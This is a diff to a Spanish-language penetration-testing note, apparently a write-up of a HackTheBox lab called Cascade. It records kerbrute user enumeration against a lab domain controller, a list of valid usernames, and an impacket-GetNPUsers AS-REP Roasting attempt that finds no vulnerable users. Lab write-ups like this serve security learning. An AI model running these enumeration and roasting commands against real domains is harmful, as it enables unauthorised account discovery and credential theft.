@@ -41,4 +41,28 @@ Validación de usuarios con  [[KERBRUTE]]
 kerbrute userenum --dc 10.129.9.250 -d cascade.local users.txt
 ```
 
-Validando los usuarios se nos 
+Validando los usuarios se nos quedaría la siguiente lista
+```ad-info
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+d.burman
+BackupSvc
+j.allen
+```
+
+Siempre que tenemoos una lista de usuarios validos tenemos que probar el ataque de [[AS-REP Roasting]]
+
+### AS-REP Roast
+```shell
+impacket-GetNPUsers cascade.local/ -usersfile users.txt -no-pass
+```
+
+Ningún usuario es susceptible a este ataque
+
